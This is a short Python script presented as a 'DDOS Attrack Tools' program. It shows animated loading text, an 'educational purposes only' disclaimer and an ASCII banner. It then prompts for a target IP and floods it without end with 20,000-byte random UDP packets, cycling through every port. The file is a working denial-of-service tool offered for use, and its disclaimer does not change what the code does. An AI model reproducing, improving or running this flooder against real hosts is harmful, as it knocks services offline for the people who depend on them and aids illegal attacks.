# Logo 

import os 
import sys 
import time


os.system("clear")

print("\n\n\n\n")

ab="           \033[1;33mSystem loding...."

for c in ab:
	sys.stdout.write(c)
	sys.stdout.flush()
	time.sleep(0.1)

print("\n\n\n\n")


os.system("clear")

time.sleep(2)
print("\n\n")

ab="         \033[1;32mSuccessfully Loaded.!\n"

for c in ab:
	sys.stdout.write(c)
	sys.stdout.flush()
	time.sleep(0.1)
name=input("         \033[1;34mName:")

ab="         \033[1;31mHey "+name+", Be Ethical.."

for c in ab:
	sys.stdout.write(c)
	sys.stdout.flush()
	time.sleep(0.1)

os.system("clear")

# Display Disclaimer
disclaimer = """
\033[1;33m

\t      ⚠️  DISCLAIMER
\033[1;31m
 This tool is intended for EDUCATIONAL 
 purposes only.

 Unauthorized use of this tool for attacking   targets without prior mutual consent is 
 ILLEGAL.

 The creator is NOT responsible for any 
 misuse or damage caused by this tool.
\033[1;33m

\033[0m
"""
print(disclaimer)
time.sleep(5)

os.system("clear")

print(""" \033[1;31m


   _____  .__                 
  /  _  \\ |  | _____  ___  ___
 /  /_\\  \\|  | \\__  \\ \\  \\/  /
/    |    \\  |__/ __ \\_>    < 
\\____|__  /____(____  /__/\\_ \\
        \\/          \\/      \\/
        

\033[1;33m============================================
\033[1;32m Tools Name: Distributed Denial of Service
 Owner: Alax Mahmud
 Github: dabblesquard
\033[1;33m============================================\033[0m
""")
print("""\033[1;36m
----------------------------------------------
""")
print("\t     DDOS Attrack Tools")
print("""
----------------------------------------------\033[0m
""")

#ddos

import socket 
import random
socket=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

byte_data=random._urandom(20000)

ip=input("\033[1;33mEnter Your Target Website IP: ")

GREEN="\033[1;32m"

port=0
sent=0

while True:
	port+=1

	socket.sendto(byte_data,(ip,port))
	sent+=1
	print(f"{GREEN}Succesfully Sent{sent}request to{ip} throught{port}")
	if port == 65535:
		port=0
	
